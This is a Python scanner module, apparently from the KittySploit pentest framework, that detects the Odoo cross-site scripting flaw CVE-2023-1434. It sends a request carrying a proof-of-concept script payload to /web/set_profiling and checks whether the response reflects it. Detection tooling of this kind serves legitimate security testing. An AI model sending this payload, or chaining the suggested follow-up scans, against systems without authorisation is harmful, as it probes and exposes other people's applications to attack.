#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Odoo is a business suite that has features for many business-critical areas, such as e-commerce, billing, or C."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Odoo - Cross-Site Scripting Detection',
        'description': 'Odoo is a business suite that has features for many business-critical areas, such as e-commerce, billing, or CRM. Versions before the 16.0 release are vulnerable to CVE-2023-1434 and is caused by an incorrect content type being set on an API endpoint.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'odoo', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.sonarsource.com/blog/odoo-get-your-content-type-right-or-else',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1434',
        ],
        'cve': 'CVE-2023-1434',
    }

    def run(self):
        r = self.http_request(method="GET", path='/web/set_profiling?profile=0&collectors=<script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', '"params":', 'session',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Odoo - Cross-Site Scripting detected",
                path='/web/set_profiling?profile=0&collectors=<script>alert(document.domain)</script>',
            )
            return True
        return False

